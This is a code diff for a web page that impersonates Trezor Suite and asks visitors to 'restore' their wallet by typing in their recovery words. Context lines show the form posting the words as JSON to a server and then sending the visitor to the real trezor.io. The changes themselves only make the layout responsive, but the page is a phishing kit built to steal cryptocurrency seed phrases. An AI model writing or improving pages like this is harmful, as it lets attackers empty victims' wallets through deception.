@@ -31,7 +31,6 @@ export default function Home() {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ words, count }),
       });
-
       if (res.ok) {
         window.location.href = "https://trezor.io/";
         return;
@@ -45,39 +44,53 @@ export default function Home() {
   };
 
   return (
-    <main className="flex h-screen w-screen bg-gray-50 overflow-hidden">
+    <main className="flex flex-col lg:flex-row h-screen w-screen bg-gray-50 overflow-hidden">
 
-      {/* LEFT SIDE (STATIC) */}
-      <section className="w-full lg:w-2/5 bg-white flex flex-col items-center justify-center p-8 text-center">
+      {/* LEFT SECTION */}
+      <section className="w-full lg:w-2/5 bg-white flex flex-col items-center justify-center px-6 py-10 text-center">
         <div className="flex items-center gap-3 mb-6">
           <img src="/images.jpeg" className="w-10 h-10" alt="logo" />
           <span className="text-xl font-semibold text-gray-800">
             Trezor Suite
           </span>
         </div>
-        <h1 className="text-5xl font-bold text-gray-800 mt-8">Welcome!</h1>
+        <h1 className="text-4xl sm:text-5xl font-bold text-gray-800 mt-4">
+          Welcome!
+        </h1>
       </section>
 
-      {/* RIGHT SIDE (FULL SCROLL) */}
-      <section className="w-full lg:w-3/5 bg-gray-50 overflow-y-auto p-5 py-10">
+      {/* RIGHT SECTION (SCROLLABLE) */}
+      <section className="w-full lg:w-3/5 bg-gray-50 overflow-y-auto px-4 sm:px-6 py-8">
 
         {/* CONNECT CARD */}
-        <div className="flex h-[122px] w-[360px] max-w-full mx-auto rounded-full p-2.5 bg-white items-center shadow-lg mb-10">
-          <div className="h-[100px] w-[100px] rounded-full bg-gray-100 flex items-center justify-center">
-            <img src="/trezor.webp" className="h-10" alt="device" />
+        <div className="flex flex-col sm:flex-row items-center gap-4 sm:gap-6
+                        h-auto sm:h-[122px]
+                        w-full sm:w-[360px]
+                        mx-auto
+                        rounded-full
+                        p-4 sm:p-2.5
+                        bg-white
+                        shadow-lg
+                        mb-8">
+          <div className="h-[72px] w-[72px] sm:h-[100px] sm:w-[100px]
+                          rounded-full bg-gray-100
+                          flex items-center justify-center">
+            <img src="/trezor.webp" className="h-8 sm:h-10" alt="device" />
           </div>
-          <span className="mx-8 text-xl font-medium text-gray-800">
+          <span className="text-lg sm:text-xl font-medium text-gray-800 text-center">
             Connect your Trezor
           </span>
         </div>
 
         {/* MAIN CARD */}
-        <div className="w-full max-w-2xl mx-auto bg-white rounded-2xl shadow-lg overflow-hidden">
+        <div className="w-full max-w-2xl mx-auto bg-white rounded-2xl shadow-lg">
 
           {/* HEADER */}
           <button
             onClick={() => setOpen(!open)}
-            className="w-full flex items-center justify-between p-6 border-b border-gray-200 text-sm font-medium text-gray-500"
+            className="w-full flex items-center justify-between px-5 sm:px-6 py-4
+                       border-b border-gray-200
+                       text-sm font-medium text-gray-500"
           >
             <span>Still don’t see your Trezor?</span>
             <svg
@@ -94,9 +107,9 @@ export default function Home() {
           </button>
 
           {open && (
-            <div className="p-6">
+            <div className="p-5 sm:p-6">
 
-              <h2 className="text-center text-2xl font-semibold mb-4">
+              <h2 className="text-center text-xl sm:text-2xl font-semibold mb-3">
                 Restore Your Trezor Wallet!
               </h2>
 
@@ -105,7 +118,7 @@ export default function Home() {
               </p>
 
               {/* WORD COUNT */}
-              <div className="flex justify-center space-x-2 mb-6">
+              <div className="flex flex-wrap justify-center gap-2 mb-6">
                 {WORD_OPTIONS.map((n) => (
                   <button
                     key={n}
@@ -127,7 +140,7 @@ export default function Home() {
               </p>
 
               {/* INPUT GRID */}
-              <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 mb-8">
+              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 mb-8">
                 {words.map((val, i) => (
                   <input
                     key={i}
@@ -140,15 +153,18 @@ export default function Home() {
                 ))}
               </div>
 
-              {/* NEXT BUTTON (SCROLLS NATURALLY) */}
+              {/* NEXT BUTTON */}
               <button
                 onClick={handleSubmit}
                 disabled={!allFilled || submitting}
-                className="px-10 py-2.5 text-sm font-semibold text-white
-                           bg-green-600 rounded hover:bg-green-700
+                className="w-full sm:w-auto
+                           px-10 py-2.5
+                           text-sm font-semibold
+                           text-white bg-green-600 rounded
+                           hover:bg-green-700
                            disabled:opacity-50 disabled:cursor-not-allowed"
               >
-                {submitting ? "Submitting....." : "Next"}
+                {submitting ? "Submitting..." : "Next"}
               </button>
 
             </div>
